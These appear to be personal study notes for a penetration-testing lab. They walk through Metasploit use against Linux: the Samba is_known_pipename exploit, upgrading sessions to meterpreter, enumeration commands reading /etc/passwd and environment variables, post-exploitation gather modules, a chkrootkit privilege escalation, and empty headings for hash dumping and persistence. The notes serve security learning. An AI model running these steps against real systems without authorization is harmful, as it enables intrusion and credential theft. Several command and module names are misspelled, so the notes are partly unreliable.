
![[Pasted image 20230830164328.png]] 

##### Upgrade shell session to meterpreter session 
1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability: 
		 - `search samba`  -->  `use exploit/Linux/samba/is_known_pipename `
		 - `pwd` 
		 - `put session in the background` 
6) upgrade shell session to meterpreter session: `sessions -u 1` 
7) sessions 2 (this is now your meterpreter session )
 `

##### Enumerate the system: 
1)  `/bin/bash -i

- `cat /etc/passwd`:
    - Gather information about user accounts, helping to identify potential targets or user management weaknesses.
- `groups root`:
    - Determine the groups to which the "root" user belongs, revealing privileges and access levels for understanding vulnerabilities.
- `cat /etc/*issue*`:
    - Identify the OS and version, aiding in selecting specific exploits or attack vectors tailored to the detected OS.
- `ip a s`:
    - Understand network interfaces and configurations, identifying entry points or routes for attacks and subnet information for network pivoting.
- `netstat -antp`:
    - View active network connections and associated processes, detecting suspicious or unauthorized connections indicating security issues.
- `ps aux`:
    - See active processes, potentially identifying vulnerabilities or unauthorized processes for exploitation or lateral movement.
- `env`:
    - Display environment variables, helping to understand session configurations, privileges, and identifying sensitive information affecting application behavior. Useful for identifying potential attack surfaces.


##### post exploitation modules 
- Enumerate configuration files on linux system: 
	- `search enum_configs` 
		- `use post/linux/gather/enum_configs` 
		- set session to meterpreter session on target 
		- `loot` 
		- `cat [path] ` (identify the shells that are on the system)

- gather environment settings 
	- `use post/multi/gather/env` 
	- `session` (set session to meterpreter session)
	- `run` 

- gather network information 
	- `use post/linux/gather/enum_network` 
	- `session` (set session to meterpreter session)
	- `run` 
	- `loot` (get al the information)
		- enumerate  information:  copy file path and: `cath path` `

- check protection systems on linux system (security features) 
	- `use post/linux/gather/enum_protection` 
		- set session to meterpreter session 
	- notes: here will al important notes are stored 

- system enumeration 
	- `use post/linux/gather/enum_system`
	- see installed packages: `loot` -> `cat [path]`


- check if target is a vm or container 
	- `search checkcointainer `
		- `use post/linux/gather/checkcontainer`  (if you are in a container- you need container-breakout to get access to host system that is hosting the container)
	- `search checkvm` 
		- `use post/linux/gather/checkvm` 

- enumerate users history
	- `search enum_users_history` 
		- `use post/linux/gather/enum_users_history`  (stores logs of commands)
		- `loot`  -> `cat` content file 

- post/linux/gather/enum_configs
- post/multi/gather/env
- post/linux/gather/enum_network
- post/linux/gather/enum_protections
- post/linux/gather/enum_system
- post/linux/gather/checkcontainer
- post/linux/gather/checkvm
- post/linux/gather/enum_users_history
- post/multi/manage/system_session
- post/linux/manage/download_exec
  
  
### Linux Privilege escalation - Exploiting A vulnerable program 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost`s ip 
4) `db_nmap -sS -sV -O ip `
5) Exploit the found vulnerability:  
	1) `search ssh_login`
	2) `use auxiliary/scanner/ssh/ssh_login `
	3) use ssh credentials 
	4) /bin/bash -i 
6) upgrade session 1 (shel) to meterpreter session: `sessions -u 1` 
7) open shell session on meterpreter 
8) user enumeration: `cat /etc/passwd `
9) find a vulnerable process so we can elevate our privileges: `ps aux` 
10) look at the root user: to find out more about binary/script: `cat [command]`
![[Pasted image 20230830210745.png]]
11) check version of chrootkit: `chrootkit -V `
go into meterpreter and exploit chrootkit (exploit/unix/local/chrootkit) 

![[Pasted image 20230830215050.png]]






























### Dumping Hashes with Hashdump 




























### Establishing persistence on Linux 


	

